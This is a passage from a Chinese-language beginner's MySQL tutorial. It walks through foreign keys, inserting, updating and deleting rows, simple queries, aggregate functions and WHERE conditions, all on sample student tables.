table class(<br>classid int primary key,<br>studentid int<br>);<br><br></code></pre></td></tr></table></figure><p>示例：学生表作为主表，班级表作为副表设置外键， MySQL命令：</p><p>​    <code>alter table class add constraint fk_class_studentid foreign key(studentid) references student05(id);</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303180124470.png" alt="在这里插入图片描述"></p><h3 id="6-1-数据一致性概念"><a href="#6-1-数据一致性概念" class="headerlink" title="6.1 数据一致性概念"></a>6.1 数据一致性概念</h3><p>大家知道：建立外键是为了保证数据的完整和统一性。但是，如果主表中的数据被删除或修改从表中对应的数据该怎么办呢？很明显，从表中对应的数据也应该被删除，否则数据库中会存在很多无意义的垃圾数据。</p><h3 id="6-2-删除外键"><a href="#6-2-删除外键" class="headerlink" title="6.2 删除外键"></a>6.2 删除外键</h3><p>语法如下：</p><p>​    <code>alter table 从表名 drop foreign key 外键名；</code></p><p>示例：删除外键 MySQL命令：</p><p>​    <code>alter table class drop foreign key fk_class_studentid;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303180554954.png" alt="在这里插入图片描述"><br>外键的那个字段不在了证明删除成功了</p><h3 id="6-3-关于外键约束需要注意的细节"><a href="#6-3-关于外键约束需要注意的细节" class="headerlink" title="6.3 关于外键约束需要注意的细节"></a>6.3 关于外键约束需要注意的细节</h3><p>1、从表里的外键通常为主表的主键<br>2、从表里外键的数据类型必须与主表中主键的数据类型一致<br>3、主表发生变化时应注意主表与从表的数据一致性问题</p><h1 id="六、数据表插入数据"><a href="#六、数据表插入数据" class="headerlink" title="六、数据表插入数据"></a>六、数据表插入数据</h1><p>在MySQL通过INSERT语句向数据表中插入数据。在此，我们先准备一张学生表，代码如下：</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table student(<br>id int,<br>name varchar(30),<br>age int,<br>gender varchar(30)<br>);<br><br></code></pre></td></tr></table></figure><h2 id="1-为表中所有字段插入数据"><a href="#1-为表中所有字段插入数据" class="headerlink" title="1. 为表中所有字段插入数据"></a>1. 为表中所有字段插入数据</h2><p>每个字段与其值是严格一一对应的。也就是说：每个值、值的顺序、值的类型必须与对应的字段相匹配。但是，各字段也无须与其在表中定义的顺序一致，它们只要与<br>VALUES中值的顺序一致即可。<br>语法如下：</p><p>​    <code>INSERT INTO 表名（字段名1,字段名2,...) VALUES (值 1,值 2,...);</code></p><p>示例：向学生表中插入一条学生信息 MySQL命令：</p><p>​    <code>insert into student (id,name,age,gender) values (1,&#39;bob&#39;,16,&#39;male&#39;);</code></p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/2021030318190944.png" alt="在这里插入图片描述"></p><h2 id="2-为表中指定字段插入数据"><a href="#2-为表中指定字段插入数据" class="headerlink" title="2. 为表中指定字段插入数据"></a>2. 为表中指定字段插入数据</h2><p>语法如下：</p><p>​    <code>INSERT INTO 表名（字段名1,字段名2,...) VALUES (值 1,值 2,...);</code></p><p>插入数据的方法基本和为表中所有字段插入数据，一样，只是需要插入的字段由你自己指定</p><h2 id="3-同时插入多条记录"><a href="#3-同时插入多条记录" class="headerlink" title="3. 同时插入多条记录"></a>3. 同时插入多条记录</h2><p>语法如下：</p><p><strong>​    INSERT INTO 表名 [(字段名1,字段名2,…)]VALUES (值 1,值 2,…),(值 1,值 2,…),…;</strong></p><p>在该方式中：(字段名1,字段名2,…)是可选的，它用于指定插人的字段名；(值 1,值 2,…),(值 1,值<br>2,…)表示要插人的记录，该记录可有多条并且每条记录之间用逗号隔开。<br>示例：向学生表中插入多条学生信息 MySQL命令：</p><p>​    <code>insert into student (id,name,age,gender) values (2,&#39;lucy&#39;,17,&#39;female&#39;),(3,&#39;jack&#39;,19,&#39;male&#39;),(4,&#39;tom&#39;,18,&#39;male&#39;);</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303182837401.png" alt="在这里插入图片描述"></p><h1 id="七、更新数据"><a href="#七、更新数据" class="headerlink" title="七、更新数据"></a>七、更新数据</h1><p>在MySQL通过UPDATE语句更新数据表中的数据。在此，我们将就用六中的student学生表</p><h2 id="1-UPDATE基本语法"><a href="#1-UPDATE基本语法" class="headerlink" title="1. UPDATE基本语法"></a>1. UPDATE基本语法</h2><p>​    <strong>UPDATE 表名 SET 字段名1&#x3D;值1[,字段名2 &#x3D;值2,…] [WHERE 条件表达式];</strong></p><p>在该语法中：字段名1、字段名2…用于指定要更新的字段名称；值1、值 2…用于表示字段的新数据；WHERE 条件表达式<br>是可选的，它用于指定更新数据需要满足的条件</p><h2 id="2-UPDATE更新部分数据"><a href="#2-UPDATE更新部分数据" class="headerlink" title="2. UPDATE更新部分数据"></a>2. UPDATE更新部分数据</h2><p>示例：将name为tom的记录的age设置为20并将其gender设置为female MySQL命令：</p><p>​    <code>update student set age=20,gender=&#39;female&#39; where name=&#39;tom&#39;;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2021030318372031.png" alt="在这里插入图片描述"></p><h2 id="3-UPDATE更新全部数据"><a href="#3-UPDATE更新全部数据" class="headerlink" title="3. UPDATE更新全部数据"></a>3. UPDATE更新全部数据</h2><p>示例：将所有记录的age设置为18 MySQL命令：</p><p>​    <code>update student set age=18;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2021030318401177.png" alt="在这里插入图片描述"></p><h1 id="八、删除数据"><a href="#八、删除数据" class="headerlink" title="八、删除数据"></a>八、删除数据</h1><p>在MySQL通过DELETE语句删除数据表中的数据。在此，我们先准备一张数据表，代码如下：</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 创建学生表<br> create table student(<br> id int,<br> name varchar(30),<br> age int,<br> gender varchar(30)<br> );<br> -- 插入数据<br> insert into student (id,name,age,gender) values (2,&#x27;lucy&#x27;,17,&#x27;female&#x27;),(3,&#x27;jack&#x27;,19,&#x27;male&#x27;),(4,&#x27;tom&#x27;,18,&#x27;male&#x27;),(5,&#x27;sal&#x27;,19,&#x27;female&#x27;),(6,&#x27;sun&#x27;,20,&#x27;male&#x27;)<br>,(7,&#x27;sad&#x27;,13,&#x27;female&#x27;),(8,&#x27;sam&#x27;,14,&#x27;male&#x27;);<br><br></code></pre></td></tr></table></figure><h2 id="1-DELETE基本语法"><a href="#1-DELETE基本语法" class="headerlink" title="1. DELETE基本语法"></a>1. DELETE基本语法</h2><p>在该语法中：表名用于指定要执行删除操作的表；[WHERE 条件表达式]为可选参数用于指定删除的条件。</p><p>​    <strong>DELETE FROM 表名 [WHERE 条件表达式];</strong></p><h2 id="2-DELETE删除部分数据"><a href="#2-DELETE删除部分数据" class="headerlink" title="2. DELETE删除部分数据"></a>2. DELETE删除部分数据</h2><p>示例：删除age等于14的所有记录 MySQL命令：</p><p>​    <code>delete from student where age=14;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303185050926.png" alt="在这里插入图片描述"></p><h2 id="3-DELETE删除全部数据"><a href="#3-DELETE删除全部数据" class="headerlink" title="3. DELETE删除全部数据"></a>3. DELETE删除全部数据</h2><p>示例：删除student表中的所有记录 MySQL命令：</p><p>​    <code>delete from student;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303185424760.png" alt="在这里插入图片描述"></p><h2 id="4-TRUNCATE和DETELE的区别"><a href="#4-TRUNCATE和DETELE的区别" class="headerlink" title="4. TRUNCATE和DETELE的区别"></a>4. TRUNCATE和DETELE的区别</h2><p>TRUNCATE和DETELE都能实现删除表中的所有数据的功能，但两者也是有区别的：  </p><ol><li>DELETE语句后可跟WHERE子句，可通过指定WHERE子句中的条件表达式只删除满足条件的部分记录；但是，TRUNCATE语句只能用于删除表中的所有记录。  </li><li>使用TRUNCATE语句删除表中的数据后，再次向表中添加记录时自动增加字段的默认初始值重新由1开始；使用DELETE语句删除表中所有记录后，再次向表中添加记录时自动增加字段的值为删除时该字段的最大值加1</li><li>DELETE语句是DML语句，TRUNCATE语句通常被认为是DDL语句</li></ol><h1 id="九、MySQL数据表简单查询"><a href="#九、MySQL数据表简单查询" class="headerlink" title="九、MySQL数据表简单查询"></a>九、MySQL数据表简单查询</h1><h2 id="1-简单查询概述"><a href="#1-简单查询概述" class="headerlink" title="1.简单查询概述"></a>1.简单查询概述</h2><p>简单查询即不含where的select语句。在此，我们讲解简单查询中最常用的两种查询：查询所有字段和查询指定字段。<br>在此，先准备测试数据，代码如下：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 创建数据库<br>DROP DATABASE IF EXISTS mydb;<br>CREATE DATABASE mydb;<br>USE mydb;<br><br>-- 创建student表<br>CREATE TABLE student (<br>    sid CHAR(6),<br>    sname VARCHAR(50),<br>    age INT,<br>    gender VARCHAR(50) DEFAULT &#x27;male&#x27;<br>);<br><br>-- 向student表插入数据<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1001&#x27;, &#x27;lili&#x27;, 14, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1002&#x27;, &#x27;wang&#x27;, 15, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1003&#x27;, &#x27;tywd&#x27;, 16, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1004&#x27;, &#x27;hfgs&#x27;, 17, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1005&#x27;, &#x27;qwer&#x27;, 18, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1006&#x27;, &#x27;zxsd&#x27;, 19, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1007&#x27;, &#x27;hjop&#x27;, 16, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1008&#x27;, &#x27;tyop&#x27;, 15, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1009&#x27;, &#x27;nhmk&#x27;, 13, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1010&#x27;, &#x27;xdfv&#x27;, 17, &#x27;female&#x27;);<br><br></code></pre></td></tr></table></figure><h2 id="2-查询所有字段（方法不唯一只是举例）"><a href="#2-查询所有字段（方法不唯一只是举例）" class="headerlink" title="2.查询所有字段（方法不唯一只是举例）"></a>2.查询所有字段（方法不唯一只是举例）</h2><p>查询所有字段 MySQL命令：</p><p>​    <code>select * from student;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302183927761.png" alt="在这里插入图片描述"></p><h2 id="3-查询指定字段（sid、sname）"><a href="#3-查询指定字段（sid、sname）" class="headerlink" title="3.查询指定字段（sid、sname）"></a>3.查询指定字段（sid、sname）</h2><p>查询指定字段（sid、sname） MySQL命令：</p><p>​    <code>select sid,sname from student;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302184506628.png" alt="在这里插入图片描述"></p><h2 id="4-常数的查询"><a href="#4-常数的查询" class="headerlink" title="4.常数的查询"></a>4.常数的查询</h2><p>在SELECT中除了书写列名，还可以书写常数。可以用于标记<br>常数的查询日期标记 MySQL命令：</p><p>​    <code>select sid,sname,&#39;2021-03-02&#39; from student;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302185049215.png" alt="在这里插入图片描述"></p><h2 id="5-从查询结果中过滤重复数据"><a href="#5-从查询结果中过滤重复数据" class="headerlink" title="5.从查询结果中过滤重复数据"></a>5.从查询结果中过滤重复数据</h2><p>在使用DISTINCT 时需要注意：<br><strong>在SELECT查询语句中DISTINCT关键字只能用在第一个所查列名之前。</strong><br>MySQL命令：</p><p>​    <code>select distinct gender from student;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302185517964.png" alt="在这里插入图片描述"></p><h2 id="6-算术运算符（举例加运算符）"><a href="#6-算术运算符（举例加运算符）" class="headerlink" title="6.算术运算符（举例加运算符）"></a>6.算术运算符（举例加运算符）</h2><p>在SELECT查询语句中还可以使用加减乘除运算符。<br>查询学生10年后的年龄 MySQL命令：</p><p>​     <code>select sname,age+10 from student;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302185922370.png" alt="在这里插入图片描述"></p><h1 id="十、函数"><a href="#十、函数" class="headerlink" title="十、函数"></a>十、函数</h1><p>在此，先准备测试数据，代码如下：</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 创建数据库<br>DROP DATABASE IF EXISTS mydb;<br>CREATE DATABASE mydb;<br>USE mydb;<br><br>-- 创建student表<br>CREATE TABLE student (<br>    sid CHAR(6),<br>    sname VARCHAR(50),<br>    age INT,<br>    gender VARCHAR(50) DEFAULT &#x27;male&#x27;<br>);<br><br>-- 向student表插入数据<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1001&#x27;, &#x27;lili&#x27;, 14, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1002&#x27;, &#x27;wang&#x27;, 15, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1003&#x27;, &#x27;tywd&#x27;, 16, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1004&#x27;, &#x27;hfgs&#x27;, 17, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1005&#x27;, &#x27;qwer&#x27;, 18, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1006&#x27;, &#x27;zxsd&#x27;, 19, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1007&#x27;, &#x27;hjop&#x27;, 16, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1008&#x27;, &#x27;tyop&#x27;, 15, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1009&#x27;, &#x27;nhmk&#x27;, 13, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1010&#x27;, &#x27;xdfv&#x27;, 17, &#x27;female&#x27;);<br><br></code></pre></td></tr></table></figure><h2 id="1-聚合函数"><a href="#1-聚合函数" class="headerlink" title="1.聚合函数"></a>1.聚合函数</h2><p>在开发中，我们常常有类似的需求：统计某个字段的最大值、最小值、<br>平均值等等。为此，MySQL中提供了聚合函数来实现这些功能。所谓聚合，就是将多行汇总成一行；其实，所有的聚合函数均如此——输入多行，输出一行。聚合函数具有自动滤空的功能，若某一个值为NULL，那么会自动将其过滤使其不参与运算。<br><strong>聚合函数使用规则 ：</strong><br>只有SELECT子句和HAVING子句、ORDER BY子句中能够使用聚合函数。例如，在WHERE子句中使用聚合函数是错误的。<br>接下来，我们学习常用聚合函数。</p><h3 id="1-1、count（）"><a href="#1-1、count（）" class="headerlink" title="1.1、count（）"></a>1.1、count（）</h3><p>统计表中数据的行数或者统计指定列其值不为NULL的数据个数<br><em>查询有多少该表中有多少人</em><br>MySQL命令：</p><p>​    <code>select count(*) from student;</code></p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/20210302190940321.png" alt="在这里插入图片描述"></p><h3 id="1-2、max（）"><a href="#1-2、max（）" class="headerlink" title="1.2、max（）"></a>1.2、max（）</h3><p>计算指定列的最大值，如果指定列是字符串类型则使用字符串排序运算</p><p><em>查询该学生表中年纪最大的学生</em><br>MySQL命令：</p><p>​    <code>select max(age) from student;</code></p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/20210304164639342.png" alt="在这里插入图片描述"></p><h3 id="1-3、min（）"><a href="#1-3、min（）" class="headerlink" title="1.3、min（）"></a>1.3、min（）</h3><p>计算指定列的最小值，如果指定列是字符串类型则使用字符串排序运算</p><p>查询该学生表中年纪最小的学生 MySQL命令：</p><p>​    <code>select sname,min(age) from student;</code></p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/20210302191531189.png" alt="在这里插入图片描述"></p><h3 id="1-4、sum（）"><a href="#1-4、sum（）" class="headerlink" title="1.4、sum（）"></a>1.4、sum（）</h3><p>计算指定列的数值和，如果指定列类型不是数值类型则计算结果为0<br>查询该学生表中年纪的总和 MySQL命令：</p><p>​    <code>select sum(age) from student;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302192155981.png" alt="在这里插入图片描述"></p><h3 id="1-5、avg（）"><a href="#1-5、avg（）" class="headerlink" title="1.5、avg（）"></a>1.5、avg（）</h3><p>计算指定列的平均值，如果指定列类型不是数值类型则计算结果为</p><p>查询该学生表中年纪的平均数 MySQL命令：</p><p>​    select avg(age) from student;</p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/20210302192048399.png" alt="在这里插入图片描述"></p><h2 id="2-其他常用函数"><a href="#2-其他常用函数" class="headerlink" title="2.其他常用函数"></a>2.其他常用函数</h2><p>这里我就不一一举例了，基本混个眼熟，以后用到再细说</p><h3 id="2-1、时间函数"><a href="#2-1、时间函数" class="headerlink" title="2.1、时间函数"></a>2.1、时间函数</h3><p>-<br>  ​    SELECT NOW();</p><ul><li>​    SELECT DAY (NOW());</li><li>​    SELECT DATE (NOW());</li><li>​    SELECT TIME (NOW());</li><li>​    SELECT YEAR (NOW());</li><li>​    SELECT MONTH (NOW());</li><li>​    SELECT CURRENT_DATE();</li><li>​    SELECT CURRENT_TIME();</li><li>​    SELECT CURRENT_TIMESTAMP();</li><li>​    SELECT ADDTIME(‘14:23:12’,’01:02:01’);</li><li>​    SELECT DATE_ADD(NOW(),INTERVAL 1 DAY);</li><li>​    SELECT DATE_ADD(NOW(),INTERVAL 1 MONTH);</li><li>​    SELECT DATE_SUB(NOW(),INTERVAL 1 DAY);</li><li>​    SELECT DATE_SUB(NOW(),INTERVAL 1 MONTH);</li><li>​    SELECT DATEDIFF(‘2019-07-22’,’2019-05-05’);</li></ul><h3 id="2-2、字符串函数"><a href="#2-2、字符串函数" class="headerlink" title="2.2、字符串函数"></a>2.2、字符串函数</h3>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">--连接函数<br>SELECT CONCAT ()<br>--<br>SELECT INSTR ();<br>--统计长度<br>SELECT LENGTH();<br><br></code></pre></td></tr></table></figure><h3 id="2-3、数学函数"><a href="#2-3、数学函数" class="headerlink" title="2.3、数学函数"></a>2.3、数学函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 绝对值<br>SELECT ABS(-136);<br>-- 向下取整<br>SELECT FLOOR(3.14);<br>-- 向上取整<br>SELECT CEILING(3.14);<br><br></code></pre></td></tr></table></figure><h1 id="十一、条件查询"><a href="#十一、条件查询" class="headerlink" title="十一、条件查询"></a>十一、条件查询</h1><p>数据库中存有大量数据，我们可根据需求获取指定的数据。此时，我们可在查询语句中通过WHERE子句指定查询条件对查询结果进行过滤。<br>在开始学习条件查询之前，我们先准备测试数据，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- 创建数据库<br>DROP DATABASE IF EXISTS mydb;<br>CREATE DATABASE mydb;<br>USE mydb;<br><br>-- 创建student表<br>CREATE TABLE student (<br>    sid CHAR(6),<br>    sname VARCHAR(50),<br>    age INT,<br>    gender VARCHAR(50) DEFAULT &#x27;male&#x27;<br>);<br><br>-- 向student表插入数据<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1001&#x27;, &#x27;lili&#x27;, 14, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1002&#x27;, &#x27;wang&#x27;, 15, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1003&#x27;, &#x27;tywd&#x27;, 16, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1004&#x27;, &#x27;hfgs&#x27;, 17, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1005&#x27;, &#x27;qwer&#x27;, 18, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1006&#x27;, &#x27;zxsd&#x27;, 19, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1007&#x27;, &#x27;hjop&#x27;, 16, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1008&#x27;, &#x27;tyop&#x27;, 15, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1009&#x27;, &#x27;nhmk&#x27;, 13, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1010&#x27;, &#x27;xdfv&#x27;, 17, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1012&#x27;, &#x27;lili&#x27;, 14, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1013&#x27;, &#x27;wang&#x27;, 15, &#x27;female&#x27;);<br><br></code></pre></td></tr></table></figure><h2 id="1-使用关系运算符查询"><a href="#1-使用关系运算符查询" class="headerlink" title="1.使用关系运算符查询"></a>1.使用关系运算符查询</h2><p>在WHERE中可使用关系运算符进行条件查询，常用的关系运算符如下所示：</p><table><thead><tr><th>关系运算符</th><th>说明</th></tr></thead><tbody><tr><td>&#x3D;</td><td>等于</td></tr><tr><td>&lt;&gt;</td><td>不等于</td></tr><tr><td>!&#x3D;</td><td>不等于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&lt;&#x3D;</td><td>小于等于</td></tr></tbody></table><blockquote><p>| 大于<br>&#x3D;| 大于等于  </p></blockquote><p>查询年龄等于或大于17的学生的信息 MySQL命令：</p><p>​    <code>select * from student where age&gt;=17;</code></p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/20210302194156529.png" alt="在这里插入图片描述"></p><h2 id="2-使用IN关键字查询"><a href="#2-使用IN关键字查询" class="headerlink" title="2.使用IN关键字查询"></a>2.使用IN关键字查询</h2><p>IN关键字用于判断某个字段的值是否在指定集合中。如果字段的值恰好在指定的集合中，则将字段所在的记录将査询出来。</p><p>查询sid为S_1002和S_1003的学生信息 MySQL命令：</p><p>​    <code>select * from student where sid in (&#39;S_1002&#39;,&#39;S_1003&#39;);</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302195114401.png" alt="在这里插入图片描述"><br>查询sid为S_1001以外的学生的信息 MySQL命令：</p><p>​    <code>select * from student where sid not in (&#39;S_1001&#39;);</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302195321878.png" alt="在这里插入图片描述"></p><h2 id="3-使用BETWEEN-AND关键字查询"><a href="#3-使用BETWEEN-AND关键字查询" class="headerlink" title="3.使用BETWEEN AND关键字查询"></a>3.使用BETWEEN AND关键字查询</h2><p>BETWEEN AND用于判断某个字段的值是否在指定的范围之内。如果字段的值在指定范围内，则将所在的记录将查询出来<br>查询15到18岁的学生信息 MySQL命令：</p><p>​    <code>select * from student where age between 15 and 18;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2021030219575915.png" alt="在这里插入图片描述"><br>查询不是15到18岁的学生信息 MySQL命令：</p><p>​    <code>select * from student where age not between 15 and 18;</code></p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/20210302195913168.png" alt="在这里插入图片描述"></p><h2 id="4-使用空值查询"><a href="#4-使用空值查询" class="headerlink" title="4.使用空值查询"></a>4.使用空值查询</h2><p>在MySQL中，使用 IS NULL关键字判断字段的值是否为空值。请注意：空值NULL不同于0，也不同于空字符串<br><strong>由于student表没有空值就不演示查询空值的了</strong><br>查询sname不为空值的学生信息 MySQL命令：</p><p>​    <code>select * from student where sname is not null;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302201810965.png" alt="在这里插入图片描述"></p><h2 id="5-使用AND关键字查询"><a href="#5-使用AND关键字查询" class="headerlink" title="5.使用AND关键字查询"></a>5.使用AND关键字查询</h2><p>在MySQL中可使用AND关键字可以连接两个或者多个查询条件。<br>查询年纪大于15且性别为male的学生信息 MySQL命令：</p><p>​    <code>select * from student where age&gt;15 and gender=&#39;male&#39;;</code></p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/20210302202328945.png" alt="在这里插入图片描述"></p><h2 id="6-使用OR关键字查询"><a href="#6-使用OR关键字查询" class="headerlink" title="6.使用OR关键字查询"></a>6.使用OR关键字查询</h2><p>在使用SELECT语句查询数据时可使用OR关键字连接多个査询条件。在使用OR关键字时，只要记录满足其中任意一个条件就会被查询出来<br>查询年纪大于15或者性别为male的学生信息 MySQL命令：</p><p>​    <code>select * from student where age&gt;15 or gender=&#39;male&#39;;</code></p><p>运行效果展示：<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302202642783.png" alt="在这里插入图片描述"></p><h2 id="7-使用LIKE关键字查询"><a href="#7-使用LIKE关键字查询" class="headerlink" title="7.使用LIKE关键字查询"></a>7.使用LIKE关键字查询</h2><p>MySQL中可使用LIKE关键字可以判断两个字符串是否相匹配</p><h3 id="7-1-普通字符串"><a href="#7-1-普通字符串" class="headerlink" title="7.1 普通字符串"></a>7.1 普通字符串</h3><p>查询sname中与wang匹配的学生信息 MySQL命令：</p><p>​    <code>select * from student where sname like &#39;wang&#39;;</code></p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/202103022030077.png" alt="在这里插入图片描述"></p><h3 id="7-2-含有-通配的字符串"><a href="#7-2-含有-通配的字符串" class="headerlink" title="7.2 含有%通配的字符串"></a>7.2 含有%通配的字符串</h3><p>%用于匹配任意长度的字符串。例如，字符串“a%”匹配以字符a开始任意长度的字符串<br>查询学生姓名以li开始的记录 MySQL命令：</p><p>​    <code>select * from student where sname like &#39;li%&#39;;</code></p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/20210302203419987.png" alt="在这里插入图片描述"><br>查询学生姓名以g结尾的记录 MySQL命令：</p><p>​    <code>select * from student where sname like &#39;%g&#39;;</code></p><p>运行效果展示：<br><img src="https://img-blog.csdnimg.cn/20210302203654189.png" alt="在这里插入图片描述"><br>查询学生姓名包含s的记录 MySQL命令：</p><p>​    <code>select * from student where sname like 